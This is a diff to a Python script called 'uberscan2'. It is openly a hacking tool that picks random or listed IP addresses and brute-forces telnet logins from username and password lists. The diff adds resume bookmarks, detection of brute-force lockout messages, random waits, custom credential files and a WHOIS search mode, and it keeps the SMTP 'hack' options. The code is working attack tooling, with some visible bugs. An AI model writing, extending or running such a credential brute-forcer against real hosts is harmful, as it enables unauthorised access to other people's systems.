@@ -8,9 +8,19 @@ def PrintUsage():
 	print ("")
 	print ("\t\t Copyright (c) 2024 Batch McNulty")
 	print ("")
-	#print ("uberscan2 -blah -blahblah: 1234")
-	print ("-timeout: nn	Timeout value in seconds (duh)")
-	print ("-port: nn		where nn = port number (ie, 25)")
+	print ("uberscan2 -blah -blahblah: 1234")
+	print ("")
+	print ("UNDER CONSTRUCTION:")
+	print ("-hack: keepwhois	Scan whois, but keep files (CONCATENATING INTO TIMEOUT)")
+	print ("-wait: nn 			wait nn seconds between tries")
+	print ("-waitrand: nn		wait a random number of seconds between 1 and nn between tries")
+	print (" END OF UNDER CONSTRUCTION")
+	print (" ")
+	print ("-save: blah.txt		save to bookmark file blah.txt (saves to BOOKMARK.TXT by default)")
+	print ("-resume: blah.txt	Resume from bookmark file bookmark.txt")
+	print ("-timeout: nn		Timeout value in seconds (duh)")
+	print ("-port: nn			where nn = port number (ie, 25)")
+	print ("-hack: searchwhois: foo	Search WHOIS database for content foo (case insensetive")
 	print ("-hack: smtphelo		Auto test numbers in ipnumbers.txt again smtp HELO command")
 	print ("-hack: smtphack		Try the SMTP hack")
 	print ("-hack: telnet		Try to hack telnet")
@@ -19,8 +29,12 @@ def PrintUsage():
 	print ("-ipfile: blah.txt	Use file blah.txt for ips" )
 	print ("-successfile: blah.txt	use file blah.txt to output successful hax!")
 	print ("-foundfile: blah.txt	use file blah.txt to output found IPs (implies -keepfound)")
+	print ("-dumpfile: blah		Use blah as dump file (dumps any & all interactions)")
+	print ("-userfile: blah.txt	Use blah.txt instead of usernames.txt")
+	print ("-pwdfile: blah.txt	Use blah.txt instead of passwords.txt")
+
 	print ("")
-	print ("NB: Default behaviour is to try random ip addresses with a timeout of 1 second")
+	print ("NB: Default behaviour is to try random ip addresses with a timeout of 2 seconds")
 	print ("\n\n")
 
 
@@ -97,11 +111,56 @@ def Hacksmtp_helo (serverHost, serverPort, timeout):
 
 
 
+#************************ SearchWHOIS ********************************
 
+def SearchWHOIS (ipnumber, searchfor):
+	import subprocess
+	import sys
+	import time
+	
+	print ("IP number:",ipnumber, "Search string:", searchfor)
+	command = "whois",ipnumber
+	print ("command:",command)
+	print ("******************************************************")
+	print ("******** SEARCHSTRING:",searchfor,"**********************")
+	searchfor = searchfor.casefold()
+	print ("****** LOWERCASE SEARCHSTRING:",searchfor,"********")
+	#whoisresult = subprocess.run ([command], capture_output = True)
+	#whoisresult = subprocess.run (command, capture_output = True)
+	try:
+		whoisresult = subprocess.check_output (command)
+	except:
+		print ("Prolly not a real IP address. Try another.")
+		return (False)
+	print ("**********************************************************")
+	print ("whoisresult:",whoisresult)
+	#finalresult = pipe.stdout.read
+	#print ("**********************************************************")
+	#print ("finalresult:",finalresult)
+	print ("**********************************************************")
+	print (type (whoisresult))
+	whoisresult = str (whoisresult)
+	print (type (whoisresult))
+	whoisresult = str(whoisresult.casefold())
+	print ("**********************************************************")
+	print ("LOWERCASE WHOISRESULT:", whoisresult)
+	print ("**********************************************************")
+	#searchresult = whoisresult.find (searchfor)
+	searchresult = searchfor in whoisresult
+	print ("searchresult:",searchresult)
+	#searchresult = b'searchfor' in whoisresult
+	print ("**********************************************************")
+	print ("******** SEARCHSTRING:",searchfor,"**********************")
+	print ("******************************************************")
 
+	if searchresult == True:
+		print ("Found!")
+	else:
+		print ("Not found!")
+	print (searchresult)
+	return (searchresult)
 
-
-
+# ************************************************************************************************
 
 
 
@@ -241,18 +300,23 @@ def Hacksmtp (serverHost, serverPort, timeout):
 
 # *********************** DumpData **********************************
 
-def DumpData(serverHost,serverPort, username, password, timeout, data):
-	dumpfile = "dump.txt"
+def DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile):
 	print ("**** Emergency dump from IP:",ipnumber,"\n port:",port,"username tried was",username, "password tried was", password,"timeout was", timeout,"data encountered was", data, "****")
 	dumphandle = open(dumpfile, "a")
 	print ("\n ************** Emergency dump ****************\n\n from IP:",ipnumber,"\n port:",port,"\n username tried was",username, "\n password tried was", password,"\n timeout was", timeout,"\ndata encountered was(newline is mine):\n", data, "\n*************************** END OF DATA *************************\n\n\n\n\n", file = dumphandle)
 	dumphandle.close()
 
 #************************ HackTelnet *************************
+# I think the problem with this is it's using recv, which is too low level a system call.
+
 def HackTelnet (serverHost, serverPort, username, password, timeout):
 		
 	import sys
 	import time
+
+	print ("Wait ",timeout,"secs for potential reconnect timeout...")
+	time.sleep (timeout)
+
 	uname_n_pwd = [username,password]
 	try:
 		sockobj= socket(AF_INET, SOCK_STREAM)
@@ -282,6 +346,7 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 		print ("openhandles:",openhandles)
 		time.sleep(1)
 		return ("BADIP")
+
 	
 	
 	for hack in range (0,2):
@@ -292,42 +357,61 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 
 		result = repr(data)
 		looptimes = 0
+
+		if (result.find('Protection of brute force attack') > -1):
+			print ("*** LOCKED OUT by ICE!! ***  (telnet found a \"Protection of brute force attack\" error message)")
+			DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
+			return ("BADIP")
+
+
+
 		####### Wait till we have what looks like a prompt (the string ":") (not the quotations marks dummy) #######
 		while (result.find(':') < 0):
 			try:
-				data = sockobj.recv(1024)
+				data = sockobj.recv(1)
+				
 			except:
 				print ("Couldn't get data after handshake negotiated. Dumping and quitting...")
-				DumpData(serverHost,serverPort, username, password, timeout, data)
+				DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
 				print ("IP: ",serverHost, ":",serverPort)
 				return ("BADIP")
 
 			result = repr(data)
 			looptimes += 1
 			print ("FROM ",serverHost, ":",result)
-			if (looptimes > 10):
+			if (looptimes > 1020):
 				print ("Something has gone wrong. Dumping data to file and quitting")
-				DumpData(serverHost,serverPort, username, password, timeout, data)
+				DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
 				print ("IP: ",serverHost, ":",serverPort)
 				return ("BADIP")
 
 		print ("sending",uname_n_pwd[hack])
+		time.sleep (1)
 		try:
 			sockobj.send (uname_n_pwd[hack].encode('ascii')+b"\n")			
 		except:
 			print ("Couldn't send (timeout?), dumping data....")
-			DumpData(serverHost,serverPort, username, password, timeout, data)
+			DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
 			return ("BADIP")
+
+		time.sleep (timeout)
 
 		try:
 			data = sockobj.recv(1024)
 		except:
 			print ("There's something there but I can't get to it. (timeout?) Keep this IP for later.")
-			DumpData(serverHost,serverPort, username, password, timeout, data)
+			DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
 			return ("BADIP")
 
 		result = repr(data)
 		print ("RECV'd:",result)
+
+		if (result.find('Protection of brute force attack') > -1):
+			print ("*** LOCKED OUT by ICE!! ***  (telnet found a \"Protection of brute force attack\" error message)")
+			DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
+			return ("BADIP")
+
+
 		'''
 		print ("from",serverHost, repr(data))
 		try:
@@ -337,15 +421,18 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 		'''
 		#print ("Attempt to get inside repr(data):")
 		#print (data (socket))
-		
+
+	time.sleep(timeout)	
+
 	try:
 		data = sockobj.recv(1024)
 	except:
 		print ("Couldn't recv, dumping data....")
-		#print ("There's something there but I can't get to it. Keep this IP for later.")
-		DumpData(serverHost,serverPort, username, password, timeout, data)
+		print ("There's something there but I can't get to it. Keep this IP for later.")
+		DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
 		return ("BADIP")
-		
+
+	time.sleep(0.1)
 	result = repr(data)
 	openhandles = sockobj.close()
 	print ("openhandles:",openhandles)
@@ -354,9 +441,20 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 	print ("FINAL RECVD DATA:",result)
 	#print ("Dec\'d:",sockno.decode())
 	#sockobj.shutdown(openhandles)
-	time.sleep (1)
+	
+	time.sleep(0.1)
+	
+	if (result.find('Protection of brute force attack') > -1):
+		print ("*** LOCKED OUT by ICE!! ***  (telnet found a \"Protection of brute force attack\" error message)")
+		DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
+		return ("BADIP")
+
+	if (result.find('User not exist.') > -1):
+		print ("WRONG USERNAME OR PASSWORD (telnet found a \"User not exist.\" error message)")
+		return (False)
+
 	if (result.find('ailed') > -1):
-		print ("WRONG USERNAME OR PASSWORD (telnet found a \"nvalid\" error message)")
+		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ailed\" error message)")
 		return (False)
 
 	if (result.find('nvalid') > -1):
@@ -375,6 +473,10 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 		print ("WRONG USERNAME OR PASSWORD (telnet found a \"sername:\" prompt)")
 		return (False)
 
+	elif (result.find('assword:') > -1):
+		print ("WRONG USERNAME OR PASSWORD (telnet found a \"sername:\" prompt)")
+		return (False)
+
 	elif (result.find('ad name or password') > -1):
 		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ad name or password\" error message)")
 		return (False)
@@ -382,6 +484,9 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 	elif (result.find('incorrect') > -1):
 		print ("WRONG USERNAME OR PASSWORD (telnet found an (\"incorrect\" error message)")
 		return (False)	
+
+
+
 	else:
 		print ("***********MAYBE (telnet)!!*********")
 		return (True)
@@ -401,12 +506,13 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 #*********************** WRITEFOUNDFILE ************************
 
 def WriteFoundFile(foundfile, ipnumber, port, username, password):
+	import time
 	#foundfile = "found.txt"
 	print ("**** found host on:",ipnumber, port,username, password, "****")
 	foundhandle = open(foundfile, "a")
 	print (ipnumber, port,username, password, file = foundhandle)
 	foundhandle.close()
-
+	time.sleep(0.1)
 
 
 
@@ -416,15 +522,24 @@ def WriteFoundFile(foundfile, ipnumber, port, username, password):
 #*********************** WRITESUCCESSFILE ************************
 
 def WriteSuccessFile(successfile, ipnumber, port, username, password):
+	import time
 	#successfile = "success.txt"
 	print ("**** Success on:",ipnumber, port,username, password, "****")
 	handle = open(successfile, "a")
 	print (ipnumber, port,username, password, file = handle)
 	handle.close()
-	
+	time.sleep(0.1)
 
 
+#************************** WRITESAVEFILE *******************************
 
+def WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number):
+	import time
+	print ("*** Writing save file",save_name,"***")
+	handle = open(save_name, "w")
+	print (save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, sep = "\n", file = handle)
+	handle.close()
+	time.sleep (0.1)
 
 
 
@@ -433,7 +548,7 @@ def GetOption(option):
 	try:
 		optno = sys.argv.index(option)+1
 		actualoption = str(sys.argv[optno])
-		print (option,":",actualoption)
+		print (option,actualoption, sep = "")
 		return (actualoption)
 	except:
 		print ("No option found for option",option)
@@ -452,7 +567,7 @@ def GetSingleOption(option):
 		optno = sys.argv.index(option)
 		actualoption = str(sys.argv[optno])
 		print (option,":",actualoption)
-		return (actualoption)
+		return (True)
 	except:
 		print ("No option found for option",option)
 		return (False)
@@ -485,13 +600,15 @@ def GetRandomIP():
 
 
  
-#*************************** MAIN ***********************
+#*************************** MAIN PROGRAM ***********************
 
 
 #********************************************************
 from socket import *
+import random
 import os
 import sys
+import time
 
 single_crack = False
 ip_number = GetOption("-ipnumber:")
@@ -500,7 +617,7 @@ if (ip_number != False):
 
 timeout = int (GetOption("-timeout:"))
 if (timeout == False):
-	timeout = 1
+	timeout = 2
 print ("Timeout:",timeout)
 
 keepfound = GetSingleOption("-keepfound")
@@ -509,12 +626,18 @@ foundfile = GetOption ("-foundfile:")
 if (foundfile == False):
 	foundfile = "found.txt"
 else:
-	keepfound = "-keepfound"
+	keepfound = True
 	
 ipfile = GetOption ("-ipfile:")
 
+dumpfile = GetOption ("-dumpfile:")
+if (dumpfile == False):
+	dumpfile = "dump.txt"
+
+
 userfile = "usernames.txt"
 pwdfile = "passwords.txt"
+
 
 port = "0"
 
@@ -526,6 +649,141 @@ if (successfile == False):
 	successfile = "success.txt"
 
 
+ip_idx = 0
+################# Handle userfile and pwdfile ######################
+
+userfile = GetOption ("-userfile:")
+pwdfile = GetOption ("-passfile:")
+pwdfile = GetOption ("-pwdfile:")
+
+if (userfile == False):	userfile = "usernames.txt"
+if (pwdfile == False):	pwdfile = "passwords.txt"
+
+####################### Handle resume file ############################
+save_name = GetOption("-save:")
+print ("save_name:\t",save_name)
+
+resume = False
+if (save_name == False):	save_name = "BOOKMARK.TXT"
+print ("save_name:\t",save_name)
+
+resume_name = (GetOption("-resume:"))
+print ("resume_name:",resume_name)
+
+if (resume_name == False):
+	resume = GetSingleOption("-resume")
+	if (resume == False):
+		if (save_name == False):
+			resume_name = "BOOKMARK.TXT"
+else:
+	resume = True
+
+if (resume == True and resume_name == False):	resume_name = "BOOKMARK.TXT"
+
+print ("save_name:\t",save_name)
+
+#if (resume_name != save_name):
+#	save_name = resume_name
+			
+print ("save_name:\t",save_name)
+print ("resume:\t\t",resume)
+print ("resume_name:\t",resume_name)
+
+#quit("resume bit")
+
+start_user_idx = 0
+start_pwd_idx = 0
+
+user_idx = 0
+pwd_idx = 0
+
+ip_idx = 0
+
+######### The actual file jiggery pokery ########
+#WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile)
+
+if resume == True:
+	
+	try:
+		infile = open (resume_name, 'r')
+	except:
+		print ("ERROR.", resume_name,"does not exist, quitting")
+		quit()
+	resume_contents = infile.readlines()
+	print (resume_contents)
+	ipfile = resume_contents[0]
+	print ("ipfile:",ipfile)
+	end = len(resume_contents)
+	print ("end:",end)
+	for stuff in range (0,end):
+		resume_contents[stuff] = resume_contents[stuff].rstrip()
+	print (resume_contents)
+	
+	# print (save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, sep = "\n", file = handle)
+	
+	save_name = resume_contents[0]
+	ipfile = resume_contents[1]
+	if (ipfile == "False"):	ipfile = False
+	if (ipfile == "n/a"):	ipfile = False
+	userfile = resume_contents[2]
+	pwdfile = resume_contents[3]
+	successfile = resume_contents[4]
+	keepfound = bool(resume_contents[5])
+	foundfile = resume_contents[6]
+	wait = resume_contents[7]
+	if (wait != 'n/a'):	timeout = int(resume_contents[7])
+	waitrand = resume_contents[8]
+	ip_idx = int(resume_contents[9])
+	port = int(resume_contents[10])
+	hack = resume_contents[11]
+	user_idx = int(resume_contents[12])
+	start_user_idx = int (user_idx)
+
+	pwd_idx = int(resume_contents[13])
+	start_pwd_idx = int (pwd_idx)
+	
+	dumpfile = (resume_contents[14])
+
+	print ("keepfound:",keepfound,type(keepfound))
+	print ("save_name:\t",save_name)
+	print ("ipfile:\t",ipfile, type(ipfile))
+	print ("single_crack:",single_crack, type(single_crack));
+	print ("ip_idx\t",ip_idx, type(ip_idx))
+	print ("ip_number:",ip_number, type(ip_number))
+	if (ipfile == False or ipfile == "False" or ipfile == 'n/a'):	
+		ipfile = False
+		print ("ipfile is FALSE")
+		try:
+			ip_number = (resume_contents[15])
+		except:
+			ip_number = False
+		print ("ip_number:",ip_number)
+		if (ip_number == "False" or ip_number == False or ip_number == "n/a"):
+			print ("IP number is FALSE, not single crack mode or old bookmark format used...")
+		else:
+			print ("IP number is something (",ip_number,"),  so setting single-crack mode to TRUE")
+			single_crack = True
+	print ("single_crack:",single_crack, type(single_crack));
+	#quit ("resume stuff")
+	
+else:
+	wait = "n/a"
+	waitrand = "n/a"
+
+if (wait != "n/a"):
+	if (wait != False):
+		wait = int(wait)
+
+if (waitrand != "n/a"):
+	if (waitrand != False):
+		waitrand = int(waitrand)
+
+#print ("hack:",hack)
+#quit ("Resume has not been developed yet.")
+
+########################################################################
+
+
 if (port == False):
 	if (hack == "smtphack"):
 		port = 25
@@ -534,38 +792,49 @@ if (port == False):
 	if (hack == "telnet"):
 		port = 23
 
-if (hack == False):
-	if (port == False):
-		print ("Can't do anyting, try specifying a port or a hack or both")
-		PrintUsage()
-		quit()
-	else:
-		if (port == "23"):
-			hack == "telnet"
+if (resume == False):
+	if (hack == False):
+		if (port == False):
+			print ("Can't do anyting, try specifying a port or a hack or resume or both")
+			PrintUsage()
+			quit()
+		else:
+			if (port == "23"):
+				hack == "telnet"
 
 
 print ("Port:",port)
 print ("hack:",hack)
 	
 #quit()
-print ("ipfile:",ipfile)
-
-
+print ("ipfile:",ipfile, type(ipfile))
+print ("ip_number",ip_number,type(ip_number))
+print ("single_crack",single_crack,type(single_crack))
 if (ipfile != False):
+	print ("ipfile NOT boolean False, so opening ipfile")
 	with open (ipfile, 'r') as file:
 		ipnumbers = file.read()
 else:
-	if (ip_number == False):
+	if (ip_number == False or ip_number == "False" or ip_number == "n/a"):
+		print ("ip_number set to boolean FALSE, so setting up dummy ipnumbers array")
 		ipnumbers = "Ignore this\n it's a dummy so we can get \n random ips from a subroutine\n\n\n"
+		print ("ipnumbers:",ipnumbers)
+
 if (single_crack == True): 
+	print ("Single crack is boolean TRUE, so setting up ipnumbers for single crack mode. ")
 	ipnumbers = ip_number+"\n\n"
+	print ("ipnumbers:",ipnumbers)
 
+#quit ("resume bit, ipnumbers bug")
 
-print (ipnumbers)
+#print (ipnumbers)
 print (len(ipnumbers))
 ipnumbers = ipnumbers.strip()
 ipnumbers_array = str.split(ipnumbers,"\n")
-print (ipnumbers_array)
+#print (ipnumbers_array)
+print ("userfile:",userfile)
+print ("pwdfile:",pwdfile)
+#quit ("pwdfile bullshit")
 
 with open (userfile, 'r') as file:
 	usernames = file.read()
@@ -584,20 +853,22 @@ print (passwords_array)
 print ("port is",port)
 print ("port is of type",type(port))
 
-ip = 0
 
-#quit()
+
 
 ############################ smtp hack ################################
 
 if hack == "smtphack":
-	while (ip < len(ipnumbers_array)): 
+	user_idx = "n/a"
+	pwd_idx = "n/a"
+	while (ip_idx < len(ipnumbers_array)): 
 		if (ipfile == False and single_crack == False):
-			ip = 0
+			ip_idx = 0
 			ipnumber = GetRandomIP()
 		else:
-			ipnumber = ipnumbers_array[ip]
-		print ("hack = ",hack,"ip:",ip, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
+			ipnumber = ipnumbers_array[ip_idx]
+
+		print ("hack = ",hack,"ip_idx:",ip_idx, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
 		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)
 		reality= Hacksmtp(ipnumber, port, timeout)
 		if (reality == True):
@@ -606,77 +877,164 @@ if hack == "smtphack":
 		else:
 			print ("No hacksmtp today!")
 			if (reality == False):
-				if (keepfound == "-keepfound"):
+				if (keepfound == True):
 					WriteFoundFile(foundfile, ipnumber, port, "n/a", "n/a")
 
-		ip += 1
-					
+		ip_idx += 1
+		WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ipnumber)
+		
 	print ("Bye bye, smtp hacking finished")
 	quit()
 
 ############################## smtp helo #######################
 
 if hack == "smtphelo":
+	user_idx = "n/a"
+	pwd_idx = "n/a"
 
-	while (ip < len(ipnumbers_array)): 
+	while (ip_idx < len(ipnumbers_array)): 
 		if (ipfile == False and single_crack == False):
-			ip = 0
+			ip_idx = 0
 			ipnumber = GetRandomIP()
 		else:
-			ipnumber = ipnumbers_array[ip]
+			ipnumber = ipnumbers_array[ip_idx]
 
-		print ("hack = ",hack,"ip:",ip, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
+		print ("hack = ",hack,"ip_idx:",ip_idx, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
 		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)
 
 		reality= Hacksmtp_helo(ipnumber, port, timeout)
 
 		if (reality == True):
-			WriteSuccessFile(successfile, ipnumber, port, "n/a", "n/a")
+			WriteSuccessFile(successfile, ipnumber, port, user_idx, pwd_idx)
 		else:
 			print ("No HELO today!")
 		
-		ip += 1
+		ip_idx += 1
+		
+		WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, successfile, keepfound, foundfile, wait, waitrand,  ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ipnumber)
 
 	print ("Bye bye, smtp helo hacking finished")
 	quit()
 
 ############################ Telnet scanning (add others as needed) ####################################
 if (hack == "telnet"):
+	
+	wait = int (timeout)
+	print ("single_crack:\t",single_crack, type(single_crack))
+	print ("start_user_idx\t",start_user_idx, type(start_user_idx))
+	#quit ("resume stuff (telnet module)")
 
-	while (ip < len(ipnumbers_array)): 
+	#print ("ipnumbers_array:",ipnumbers_array)
+	print ("type is:",type(ipnumbers_array))
+	while (ip_idx < len(ipnumbers_array)): 
+
+		execute = "cp " + save_name+ " " + save_name + ".bak"
+		print (execute)
+		os.system(execute)
+		time.sleep (0.1)
+		
 		if (ipfile == False and single_crack == False):
-			ip = 0
+			ip_idx = 0
 			ipnumber = GetRandomIP()
 		else:
-			ipnumber = ipnumbers_array[ip]
+			ipnumber = ipnumbers_array[ip_idx]
 		
-		print ("hack = ",hack,"ip:",ip, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
+		#if (resume == True):
+		
+		if (single_crack == True):	
+			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ipnumber)
+		else:			
+			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a")
+		
+		
+		print ("hack = ",hack,"ip_idx:",ip_idx, "keepfound:",keepfound, type(keepfound), "foundfile:",foundfile, "successfile:",successfile)
 		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)
-		for user in range (0, len(usernames_array)):
-			username = usernames_array[user]
-			for pwd in range (0, len(passwords_array)):
-				password = passwords_array[pwd]
+		for user_idx in range (start_user_idx, len(usernames_array)):
+			
+			if (single_crack == True):	
+				WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ipnumber)
+			else:			
+				WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a")
+						
+			username = usernames_array[user_idx]
+			for pwd_idx in range (start_pwd_idx, len(passwords_array)):
+				password = passwords_array[pwd_idx]
 
 				print ("Trying ",ipnumber,":",port, "Username:", username, "Password:",password)		
 				
 				reality = HackTelnet (ipnumber, port, username, password, timeout)
 				if (reality == True):
 					WriteSuccessFile(successfile, ipnumber, port, username, password)
-					if (keepfound == "-keepfound"):
+					if (keepfound == True):
 						WriteFoundFile(foundfile, ipnumber, port, username, password)
 				if (reality == False):
 					print ("SORRY, NO FISH TODAY!")
-					if (keepfound == "-keepfound"):
+					if (keepfound == True):
 						WriteFoundFile(foundfile, ipnumber, port, username, password)
+
+				if (single_crack == True):	
+					WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ipnumber)
+				else:			
+					WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a")
+
+				print ("\t\t**** INDEX:",ip_idx,"****")
 				if (reality == "BADIP"):
 					print ("BAD IP ADDRESS, skipping...")
-					print ("index:",ip)
-					#del (ipnumbers_array[ip])
+					print ("index:",ip_idx)
+					#del (ipnumbers_array[ip_idx])
 					break
-			if (reality == "BADIP"):	break
-		# DANGER - ABOVE LINE (break) may cause and INFINITE LOOP
-		ip += 1
+					# This loses nesting but it doesn't need it as it's a bad IP
+					
+			start_pwd_idx = 0
 
-		#if (reality == "BADIP"):	break		
+			if (reality == "BADIP"):	break
+		# DANGER - ABOVE LINE (break) may cause an INFINITE LOOP
+		ip_idx += 1
+		start_user_idx = 0
+		start_pwd_idx = 0
+
+###################################### WHOIS SCANNING ############################################
+if hack == "searchwhois:":
+	user_idx = "n/a"
+	pwd_idx = "n/a"
+
+	print ("Searchwhois selected!")
+	#print (foundfile)
+	if (foundfile == "found.txt"):
+		foundfile = "WHOISsearch.txt"
+	#print (foundfile)
+	#quit()
+
+	searchfor = GetOption ("searchwhois:")
+	print ("found ",searchfor, "in GetOption")
+	print ("Will search WHOIS database for ",searchfor)
+	loop = 0
+	while (ip_idx < len(ipnumbers_array)):
+		print ("#### LOOPED ",loop,"TIMES ###") 
+		randno = random.randint (1, 5)
+		print ("#################")
+		print ("# randno: ",randno,"#")
+		print ("#################")
+		time.sleep (randno)
+		if (ipfile == False and single_crack == False):
+			ip_idx = 0
+			ipnumber = GetRandomIP()
+		else:
+			ipnumber = ipnumbers_array[ip_idx]
+		reality = SearchWHOIS (ipnumber, searchfor)
+		if (reality == True):
+			print ("Found",searchfor,"in WHOIS database, saving")
+			#WriteSuccessFile (successfile, ipnumber, 
+			WriteFoundFile (foundfile, ipnumber, "n/a", searchfor, "n/a")
+		ip_idx += 1
+		loop += 1
+
+		if (single_crack == False):	
+			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ipnumber)
+		else:			
+			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a")
 		
+
+
+
 print ("It's all over!")
